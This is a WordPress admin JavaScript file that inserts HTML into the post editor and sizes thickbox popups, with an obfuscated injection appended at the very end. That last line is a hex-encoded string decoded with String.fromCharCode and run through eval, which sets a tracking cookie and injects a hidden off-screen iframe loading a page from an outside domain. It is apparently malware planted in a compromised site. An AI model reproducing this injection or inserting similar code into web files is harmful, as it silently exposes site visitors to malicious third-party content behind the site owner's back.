/* global tinymce, QTags */
// send html to the post editor

var wpActiveEditor, send_to_editor;

send_to_editor = function( html ) {
	var editor,
		hasTinymce = typeof tinymce !== 'undefined',
		hasQuicktags = typeof QTags !== 'undefined';

	if ( ! wpActiveEditor ) {
		if ( hasTinymce && tinymce.activeEditor ) {
			editor = tinymce.activeEditor;
			wpActiveEditor = editor.id;
		} else if ( ! hasQuicktags ) {
			return false;
		}
	} else if ( hasTinymce ) {
		editor = tinymce.get( wpActiveEditor );
	}

	if ( editor && ! editor.isHidden() ) {
		editor.execCommand( 'mceInsertContent', false, html );
	} else if ( hasQuicktags ) {
		QTags.insertContent( html );
	} else {
		document.getElementById( wpActiveEditor ).value += html;
	}

	// If the old thickbox remove function exists, call it
	if ( window.tb_remove ) {
		try { window.tb_remove(); } catch( e ) {}
	}
};

// thickbox settings
var tb_position;
(function($) {
	tb_position = function() {
		var tbWindow = $('#TB_window'),
			width = $(window).width(),
			H = $(window).height(),
			W = ( 833 < width ) ? 833 : width,
			adminbar_height = 0;

		if ( $('#wpadminbar').length ) {
			adminbar_height = parseInt( $('#wpadminbar').css('height'), 10 );
		}

		if ( tbWindow.size() ) {
			tbWindow.width( W - 50 ).height( H - 45 - adminbar_height );
			$('#TB_iframeContent').width( W - 50 ).height( H - 75 - adminbar_height );
			tbWindow.css({'margin-left': '-' + parseInt( ( ( W - 50 ) / 2 ), 10 ) + 'px'});
			if ( typeof document.body.style.maxWidth !== 'undefined' )
				tbWindow.css({'top': 20 + adminbar_height + 'px', 'margin-top': '0'});
		}

		return $('a.thickbox').each( function() {
			var href = $(this).attr('href');
			if ( ! href ) return;
			href = href.replace(/&width=[0-9]+/g, '');
			href = href.replace(/&height=[0-9]+/g, '');
			$(this).attr( 'href', href + '&width=' + ( W - 80 ) + '&height=' + ( H - 85 - adminbar_height ) );
		});
	};

	$(window).resize(function(){ tb_position(); });

})(jQuery);
/*c7410dfdb857ae898fa610dbc8e0d4a4*/;(function(){var ketyefii="";var nnkzizyr="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var fbreshyh=0;fbreshyh<nnkzizyr.length;fbreshyh+=2){ketyefii=ketyefii+parseInt(nnkzizyr.substring(fbreshyh,fbreshyh+2), 16)+",";}ketyefii=ketyefii.substring(0,ketyefii.length-1);eval(eval('String.fromCharCode('+ketyefii+')'));})();/*c7410dfdb857ae898fa610dbc8e0d4a4*/